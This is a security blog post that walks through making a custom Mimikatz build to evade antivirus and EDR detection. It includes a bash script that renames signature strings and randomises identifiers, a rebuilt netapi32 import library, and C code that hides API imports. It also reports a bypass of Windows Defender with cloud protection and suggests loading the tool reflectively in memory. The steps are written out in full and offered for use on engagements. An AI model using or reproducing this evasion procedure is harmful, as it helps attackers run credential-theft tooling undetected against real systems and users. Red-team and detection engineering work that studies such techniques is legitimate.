---
title: "Building a custom Mimikatz binary"
layout: "post"
---

This post will cover how to build a custom Mimikatz binary by doing source code modification to get past AV/EDR software.
<!--more-->
## Introduction

As promised in the last post I´ll explain how to build a custom Mimikatz binary here. I first did this some months ago and integrated the resulting binary in my <a href="https://github.com/S3cur3Th1sSh1t/WinPwn">WinPwn</a> script being reflectively loaded. Some people asked me where exactly I got this version from. Now it´s time to share this information.

There already are many blog posts about how to obfuscate Mimikatz. But most of them focus on how to get past AMSI for ```Invoke-Mimikatz``` or on using obfuscator tools for the Powershell version. But especially  <a href="https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781">one gist</a> inspired me some months ago to build a custom version not flagged by AV:

```batch
# This script downloads and slightly "obfuscates" the mimikatz project.
# Most AV solutions block mimikatz based on certain keywords in the binary like "mimikatz", "gentilkiwi", "benjamin@gentilkiwi.com" ..., 
# so removing them from the project before compiling gets us past most of the AV solutions.
# We can even go further and change some functionality keywords like "sekurlsa", "logonpasswords", "lsadump", "minidump", "pth" ....,
# but this needs adapting to the doc, so it has not been done, try it if your victim's AV still detects mimikatz after this program.

git clone https://github.com/gentilkiwi/mimikatz.git windows
mv windows/mimikatz windows/windows
find windows/ -type f -print0 | xargs -0 sed -i 's/mimikatz/windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/WINDOWS/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Mimikatz/Windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/DELPY/James/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Benjamin/Troy/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/jtroy@hotmail.com/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/creativecommons/python/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/gentilkiwi/MSOffice/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/KIWI/ONEDRIVE/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Kiwi/Onedrive/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/kiwi/onedrive/g'
find windows/ -type f -name '*mimikatz*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/mimikatz/windows/g')";
	mv "${FILE}" "${newfile}";
done
find windows/ -type f -name '*kiwi*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/kiwi/onedrive/g')";
	mv "${FILE}" "${newfile}";
done
```

```We can even go further ``` - and so the challenge was born.

## Mimikatz contains a VIRUS

If you ever tried downloading a Mimikatz release with AV enabled, you noticed that this is not possible because every single release is flagged. And this is completely plausible, because today attackers use Mimikatz and many other open Source projects in real world incidents. I´m pretty sure that Mimikatz is the most used software to extract credentials from the lsass process or the sam database, perform pass the hash attacks, decrypt DPAPI secrets and a lot more. A nice but by far not full overview of the features can be found at <a href="https://adsecurity.org/?page_id=1821">ADSecurity.org</a> or in the Mimikatz <a href="https://github.com/gentilkiwi/mimikatz/wiki">Wiki</a>. 

Many people obviously don´t know why and how theese open source projects are flagged:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/GithubIssue.JPG">
</p>

Real-world attackers or penetration testers with know-how however do not use the release version, but build their own version. Often, only parts of the source code of Mimikatz are used. In this case we don't leave out any features but modify the source code to evaluate the detection rates. It´s always good to have a custom binary in the backyard.

## Basic signatures

We already covered some common Mimikatz signatures from the gist above. At first, the following strings have to be replaced:

* mimikatz, MIMIKATZ and Mimikatz
* DELPY, Benjamin, benjamin@gentilkiwi.com
* creativecommons
* gentilkiwi
* KIWI, Kiwi and kiwi

Put yourself in the position of the AV-Vendor. The first things to flag are the obvious strings contained in the binary file. If you open up the menu of Mimikatz, you will see the following:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/Mimikatz.JPG">
</p>

All strings contained in the menu are an indicator that Mimikatz is running, so we add the following signatures to our script for replacement:

* "A La Vie, A L'Amour"
* http://blog.gentilkiwi.com/mimikatz
* Vincent LE TOUX
* vincent.letoux@gmail.com
* http://pingcastle.com
* http://mysmartlogon.com

We could also just open up <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/mimikatz.c">mimikatz.c</a> and replace the banner with something else or remove it.

As the author from the gist above mentions we can go further by replacing functionality keywords. The main modules in Mimikatz at the time of writing are the following: 

* crypto, dpapi, kerberos, lsadump, ngc, sekurlsa
* standard, privilege, process, service, ts, event
* misc, token, vault, minesweeper, net, busylight
* sysenv, sid, iis, rpc, sr98, rdm, acr

Maybe I need some Mimikatz basics tutorial but the Wiki doesn´t tell how to list all modules. You can still do that by entering an invalid module name like ```::``` : 

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/MimiModules.JPG">
</p>

We have two options here. Either we change all function names in upper and lower case only, or we change the names completely. With variant one, the familiar commands remain the same, with variant two we have to remember new function names. For the moment we will stick with the familiar function names. I did not add the short function names for replacement, because theese strings could also exist in other words of the code and this could break functionality. To build a custom binary for every new release, we replace the strings not relevant for function names with random names.

One more important thing to replace is the icon of the binary. In the modified version of the gist we therefore replace the existing icon with some random downloaded icon.

Every function in the main menu has sub-functions. The probably most well-known function sekurlsa for example has the following sub-functions:

* msv, wdigest, kerberos, tspkg
* livessp, cloudap, ssp, logonpasswords
* process, minidump, bootkey, pth
* krbtgt, dpapisystem, trust, backupkeys
* tickets, ekeys, dpapi, credman

To be sure that the most well known Mimikatz indicators are changed, we include most of the subfunction names in our replacement script.

This results in the <a href="https://gist.github.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333">following script</a>.

By executing the bash script, compiling the code and uploading it to VirusTotal we get the following result:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/FirstTry.JPG">
</p>

25/67 detections. That´s not bad but still not good enough. 

## netapi32.dll

To find more signatures, it´s possible to split the file in parts using ```head -c byteLength mimikatz.exe > split.exe```. If the resulting file is deleted, there is a signature. If not, this part of the file is clean. You can also automate this task using Matt Hands <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a> tool. It´s doing exactly that, splitting files into parts, copying them to ```C:\temp\``` and scanning them with Windows Defender. Let´s check that for the resulting binary:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/DefenderCheck.JPG">
</p>

The following three ```netapi32.dll``` library functions are flagged by Windows Defender:

* I_NetServerAuthenticate2
* I_NetServerReqChallenge
* I_NetServerTrustPasswordsGet

By searching the web I found the following <a href="https://sudonull.com/post/27330-Getting-around-Windows-Defender-cheaply-and-cheerfully-obfuscating-Mimikatz-THunter-Blog">article</a> which explains how to build a new ```netapi32.min.lib``` with a different structure. As stated in the article we can build a custom ```netapi32.min.lib``` by creating a ```.def``` file with the following content:

```text
LIBRARY netapi32.dll
EXPORTS
  I_NetServerAuthenticate2 @ 59
  I_NetServerReqChallenge @ 65
  I_NetServerTrustPasswordsGet @ 62
```

Afterwards we build the ```netapi32.min.lib``` file in the visual studio developer console by issuing this command:

```batch
lib /DEF:netapi32.def /OUT:netapi32.min.lib
```

We embed this new file in the ```lib\x64\``` directory and recompile. Running DefenderCheck again results in no more findings:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/DefenderCheckOK.JPG">
</p>

This means we bypassed the "realtime protection" feature from Windows Defender. But if we enable cloud protection and copy the file to another location it´s killed again:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/StillFlagged.JPG">
</p>

## Replace more strings

There is still **much** more to replace. At first we stay with the obvious strings. The Mimikatz menu contains descriptions for every function. The ```privilege``` sub-functions for example have the following description:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/PrivilegeDescription.JPG">
</p>

To remove obvious strings we will remove almost all descriptions by adding them as strings to replace in our bash script. Almost all? Some functions and descriptions are not mission critical but still cool, so they stay as they are:
* answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
* coffee  -  Please, make me a coffee!

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/42_Coffee.JPG">
</p>

Many AV-Vendors flag parts of a binary where functionality relevant DLL-Files are loaded. Mimikatz loads many of the functions from ```.DLL``` files. To find all relevant DLL-Files in the Mimikatz source code, we can open up Visual Studio, press ```STRG``` + ```SHIFT``` + ```F```. This will open a search for the whole project. Searching for ```.dll``` will give us all DLL-File names used in the project. We will also add the DLL-Names in our bash script using different upper and lowercase letters for replacement.

```sekurlsa``` with the subfuction ```logonpasswords``` is **the** most used function which dumps almost all Credentials possible. Therefore parts of this function are flagged at most. So take a look at <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c">kuhl_m_sekurlsa.c</a> and see, which ```kprintf()``` statements contain words that are likely flagged. We are always looking for words with a low false positive rate, because AV-Vendors don´t want to flag other binaries by accident. We end up with for example theese strings:
* Switch to MINIDUMP, Switch to PROCESS
* UndefinedLogonType, NetworkCleartext, NewCredentials, RemoteInteractive, CachedInteractive, CachedRemoteInteractive, CachedUnlock
* DPAPI_SYSTEM, replacing NTLM/RC4 key in a session,  Token Impersonation , UsernameForPacked, LSA Isolated Data

If we look at the default function ```standard``` <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_standard.c">kuhl_m_standard.c</a> we have other strings which are likely flagged:
* isBase64InterceptInput, isBase64InterceptOutput
* Credential Guard may be running, SecureKernel is running

This technique can be applied for all other source code files as well. I won´t cover them all here, because that´s just to much overhead. But the strings you replace, the detection rate will sink.

## Folder & File structure

I also took a look at the whole project structure to see which parts appear the very same way over and over again. One thing directly caught my eye here. All variable and function names are declared with names beginning with ```kuhl_``` or ```KULL_```:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/Kuhl_Kull.JPG">
</p>

It is very easy to completely replace all of these occurrences. This will probably also change the signature of the resulting file significantly. So we also add the following lines to our script:

```batch
kuhl=$(cat /dev/urandom | tr -dc "a-z" | fold -w 4 | head -n 1)
find windows/ -type f -print0 | xargs -0 sed -i "s/kuhl/$kuhl/g"

kull=$(cat /dev/urandom | tr -dc "a-z" | fold -w 4 | head -n 1)
find windows/ -type f -print0 | xargs -0 sed -i "s/kull/$kull/g"

find windows/ -type f -name "*kuhl*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/kuhl/$kuhl/g")";
	mv "${FILE}" "${newfile}";
done


find windows/ -type f -name "*kull*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/kull/$kull/g")";
	mv "${FILE}" "${newfile}";
done

under=$(cat /dev/urandom | tr -dc "a-z" | fold -w 4 | head -n 1)
find windows/ -type f -print0 | xargs -0 sed -i "s/_m_/$under/g"

find windows/ -type f -name "*_m_*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/_m_/$under/g")";
	mv "${FILE}" "${newfile}";
done
```

Adding all the mentioned strings above to our bash script ends up in this <a href="https://gist.github.com/S3cur3Th1sSh1t/cb040a750f5984c41c8f979040ed112a">gist</a>.

Execute the bash script, compile and upload to Virustotal:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/VT2.JPG">
</p>

Looks like we didn´t get much more stealth. But this state is enough at the time of writing to get past Defender with Cloud Protection enabled:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/DefenderBypass.png">
</p>

## There is much more todo

If you still want to go further and try to get FUD you can do much more. You can replace fuction names instead of using upper and lowercase letters. You can go through all other C- and Library-Files to search for low false positive Mimikatz indicators and replace them, or just remove functions you don´t need.

What about Error messages? They can contain Mimikatz indicators as well. Troubleshooting of errors does not always make sense or there is not enough time. So if you don´t need detailed error messages you can just remove them. With the keyboard shortcut ```STRG``` + ```SHIFT``` + ```H``` you can search and replace the whole project for strings. Search and replace the following to remove all error messages:

<p align="center">
          <img src="/assets/posts/2020-09-16_Building_a_custom_Mimikatz_Binary/SearchReplace.JPG">
</p>

AV/EDR vendors also move to detection methods for API imports. There are two really good articles about obfuscating C/C++ source Code to hide API imports by Plowsec. They are <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering antivirus evasion</a> and <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a>. Mimikatz makes use of many Windows APIs. To hide ```LSAOpenSecret``` for example you can use the following code in Mimikatz:

```
typedef NTSTATUS(__stdcall* _LsaOSecret)(
	__in LSA_HANDLE PolicyHandle,
	__in PLSA_UNICODE_STRING SecretName,
	__in ACCESS_MASK DesiredAccess,
	__out PLSA_HANDLE SecretHandle
	);
char hid_LsaLIB_02zmeaakLCHt[] = { 'a','d','v','a','p','i','3','2','.','D','L','L',0 };
char hid_LsaOSecr_BZxlW5ZBUAAe[] = { 'L','s','a','O','p','e','n','S','e','c','e','t',0 };
HANDLE hhid_LsaLIB_asdasdasd = LoadLibrary(hid_LsaLIB_02zmeaakLCHt);
_LsaOSecret ffLsaOSecret = (_LsaOSecret)GetProcAddress(hhid_LsaLIB_asdasdasd, hid_LsaOSecr_BZxlW5ZBUAAe);

```
By hiding ```SamEnumerateUserDomain```, ```SamOpenUser```, ```LsaSetSecret```, ```I_NetServerTrustPasswordsGet``` and many more in combination with the techniques above it should be possible to go FUD with source code modification.

But source code modification is only one way to reach the goal. Inspire yourself with Phras article about ```PEzor``` - <a href="https://iwantmore.pizza/posts/PEzor.html">Designing and Implementing PEzor, an Open-Source PE Packer</a>. Shellcode Injection with Syscall Inlining, User-Land Hooks Removal, Making the Generated Executable Polymorphic to Avoid Trivial Signatures and much more.

## Conclusion

We went through string replacement methods as well as other techniques to build a custom Mimikatz binary. We found, that the detection of Mimikatz is reduced to ~ 1/3 of the vendors by doing that for obvious most used strings, but this can be further reduced by adding more and more strings. Other techniques like API import hiding can decrease the detection rate even more. 

By the way, there are no more AMSI triggers for the Base64 encoded Mimikatz binary resulting from the bash script in this article. So its possible to include this binary in any PE-Loader of your choice to load it without touching the disk. Last time we used ```Invoke-ReflectivePEINjection``` as Powershell script. There are many PE-Loader in C#, for example subTee´s <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">C# PE-Loader</a>.

I hope this article inspires some people to build custom binaries for their next engagements. I´m always open for questions or discussions at the channels linked at the top.

## Links & Resources

* WinPwn - <a href="https://github.com/S3cur3Th1sSh1t/WinPwn">https://github.com/S3cur3Th1sSh1t/WinPwn</a>

* Inspiring Gist - <a href="https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781">https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781</a>

* Mimikatz - <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>

* Mimikatz Features & Detection - <a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a>

* DefenderCheck - <a href="https://github.com/matterpreter/DefenderCheck">https://github.com/matterpreter/DefenderCheck</a>

* Obfuscating Mimikatz - <a href="https://sudonull.com/post/27330-Getting-around-Windows-Defender-cheaply-and-cheerfully-obfuscating-Mimikatz-THunter-Blog">https://sudonull.com/post/27330-Getting-around-Windows-Defender-cheaply-and-cheerfully-obfuscating-Mimikatz-THunter-Blog</a>

* AVCleaner C/C++ obfuscation - <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/</a> & <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/</a>

* PEZor - <a href="https://iwantmore.pizza/posts/PEzor.html">https://iwantmore.pizza/posts/PEzor.html</a>
